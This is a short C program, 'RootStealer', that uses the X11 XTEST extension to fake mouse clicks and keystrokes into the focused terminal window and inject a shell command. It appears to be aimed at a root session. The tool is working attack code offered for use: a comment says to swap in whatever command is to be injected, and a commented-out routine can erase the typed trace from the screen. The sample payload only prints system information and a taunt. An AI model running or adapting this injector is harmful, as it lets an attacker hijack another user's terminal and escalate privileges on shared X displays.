/*
RootStealer - X11 command injection on term

Edi

*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <X11/Xlib.h>
#include <X11/extensions/XTest.h>
#include <X11/keysym.h>

Display *display;
int foo;
Window winFocus;
int revert;

void type_key(unsigned c) 
{
	XTestFakeKeyEvent(display, XKeysymToKeycode(display, c), True, CurrentTime);
	XTestFakeKeyEvent(display, XKeysymToKeycode(display, c), False, CurrentTime);
	XFlush(display);
}

void type_char(char c) 
{
	type_key((unsigned)c);
}

void type_string_delay(const char* str, unsigned delay) 
{
	unsigned i, len = strlen(str);
  
	for (i = 0; i < len; i++) 
	{
    		type_char(str[i]);
    		usleep(delay * 10);
  	}
}

void type_string(const char* str) 
{
	type_string_delay(str, 0);
}

void erase(unsigned times, unsigned delay) 
{
	for (; times > 0; times--) 
	{
    		type_key(XK_BackSpace);
    		usleep(delay * 1000);
  	}
}

int main(int argc, char **argv)
{
// use ten blank spaces and append with command CMD that you need to inject
	char *CMD="          uname -a; echo 'I have your root baby!'";
		if((display=XOpenDisplay(NULL)) == NULL) 
		{
    			fprintf(stderr, "%s: can't open %s\n", argv[0], XDisplayName(NULL));
    			exit(1);
  		}

  		if(XTestQueryExtension(display, &foo, &foo, &foo, &foo) == False) 
		{
    			fprintf(stderr,"XTEST extension missing\n");
    			exit(1);
  		}
  
	sleep(2);
  	XGetInputFocus(display, &winFocus, &revert);
  	XTestFakeButtonEvent(display, 1, 1, 0);
	XTestFakeButtonEvent(display, 1, 0, 0);
  	XFlush(display);
  	XTestFakeButtonEvent(display, 1, 1, 0);
  	XTestFakeButtonEvent(display, 1, 0, 0);
  	XFlush(display);
  	sleep(1);
  	type_string(CMD);
  	type_key(XK_KP_Enter);
  	sleep(1);
// if  you need erase the current verbose  of term try that function erase()
//  erase(21, 100);

  	XCloseDisplay(display);
  	return 0;
}
